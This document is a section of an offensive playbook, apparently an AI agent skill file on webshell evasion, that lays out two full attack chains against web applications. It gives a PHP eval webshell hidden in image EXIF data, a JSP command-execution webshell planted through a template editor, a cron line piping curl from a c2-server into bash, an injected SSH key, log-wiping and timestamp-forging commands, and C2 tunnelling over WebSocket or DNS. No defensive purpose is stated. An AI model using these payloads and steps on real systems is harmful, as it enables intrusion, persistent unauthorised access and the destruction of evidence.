### 10.1 Full Chain: File Upload Bypass + Evasion + Persistence

**Scenario: PHP web application with file upload restricted to images only.**

```
Phase 1: Reconnaissance
  - Identify upload endpoint: POST /profile/avatar/upload
  - Identify allowed extensions: jpg, png, gif
  - Identify WAF: Cloudflare
  - Identify backend: PHP 8.1, Apache 2.4

Phase 2: File Upload Bypass
  Attempt 1: Direct .php upload → Blocked (extension check)
  Attempt 2: shell.php.jpg → Blocked (WAF inspects MIME)
  Attempt 3: shell.php%00.jpg → Blocked (PHP 8.1 fixed null byte)
  Attempt 4: shell.pHp → Blocked (case-insensitive check)
  Attempt 5: .htaccess upload → Blocked (filename blacklist)
  Attempt 6: shell.jpg with PHP code in EXIF → Uploaded!

  Method: exiftool -Comment='<?php if(isset($_REQUEST["x"])){@eval($_REQUEST["x"]);} ?>' avatar.jpg

Phase 3: Trigger WebShell
  - Find the uploaded file path: /uploads/avatars/1234567890.jpg
  - Include via LFI: /profile/view?file=../../../uploads/avatars/1234567890.jpg
  - Or: rename to .php via another vulnerability

Phase 4: Establish Persistence
  - Deploy obfuscated WebShell to multiple locations:
    * /uploads/avatars/config.php (disguised as config)
    * /images/logo.php (disguised as image)
    * /cache/.cache.php (hidden file)
    * /tmp/sess_abc123 (in PHP session directory)

  - Add cron job via WebShell:
    echo '* * * * * curl -s http://c2-server/beacon | bash' >> /var/spool/cron/crontabs/www-data

  - Create .ssh/authorized_keys:
    echo 'ssh-rsa AAAAB3...' >> /home/www-data/.ssh/authorized_keys

  - Deploy memory horse (if Java/Tomcat):
    Filter memory horse injection as shown in Section 6

Phase 5: Cleanup
  - Remove original upload traces
  - Clear web server logs:
    sed -i '/upload.*avatar/d' /var/log/apache2/access.log
  - Restore file timestamps:
    touch -r /etc/passwd /uploads/avatars/config.php
```

### 10.2 Scenario: WAF-Protected Enterprise Environment

**Target: Enterprise Java application behind Alibaba Cloud WAF + Imperva.**

```
Phase 1: WAF Fingerprinting
  - Alibaba Cloud: Response headers (X-Cache, ali-cdn)
  - Imperva: Response headers (X-Iinfo, X-CDN)

Phase 2: Initial Access
  - Exploit SQL injection in search endpoint (bypassing WAF via HPP)
  - Extract admin credentials from database
  - Login to admin panel

Phase 3: WebShell Deployment
  - Admin panel has "template editor" feature
  - Edit a JSP template to include WebShell:
    <%@ page import="java.io.*" %>
    <%
    String p = request.getParameter("p");
    if (p != null && p.equals(System.getProperty("custom.key"))) {
        Process proc = Runtime.getRuntime().exec(request.getParameter("c"));
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(proc.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) out.println(line);
    }
    %>

  - The WebShell is hidden in legitimate application code
  - WAF sees it as normal application traffic

Phase 4: Traffic Tunneling
  - Use WebSocket for C2 communication:
    * Upgrade connection to WebSocket
    * WAF often doesn't inspect WebSocket frames deeply
    * Encrypt payload within WebSocket frames

  - Or use DNS tunneling for C2:
    * Encode commands in DNS queries
    * exfiltrate data in DNS responses
    * Tools: dnscat2, iodine

Phase 5: Lateral Movement
  - From WebShell, scan internal network
  - Find database servers, file servers, domain controllers
  - Use stolen credentials for lateral movement
  - Deploy additional persistence mechanisms
```



---
📖 本切片 1/2 结束。 续篇: `skill_view(name="webshell-evasion", file_path="references/chapter-10-real-world-scenarios-02.md")`